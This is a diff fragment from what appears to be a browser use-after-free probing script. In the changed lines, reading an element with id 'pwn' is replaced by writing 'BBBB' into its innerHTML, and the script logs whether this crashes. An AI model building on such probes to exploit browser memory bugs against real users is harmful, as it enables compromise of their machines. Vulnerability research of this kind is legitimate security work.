@@ -146,11 +146,15 @@ function probe(fsTarget) {
     } catch(e) {
         log("[UAF] write innerHTML crash");
     }
+    
     try {
     let el = document.getElementById("pwn");
-    log("[LEAK] getElementById = " + el);
+    if (el) {
+        el.innerHTML = "BBBB";
+        log("[LEAK] write no pwn OK");
+    }
 } catch(e) {
-    log("[LEAK] erro getElementById");
+    log("[LEAK] write no pwn crash");
 }
 
     // layout
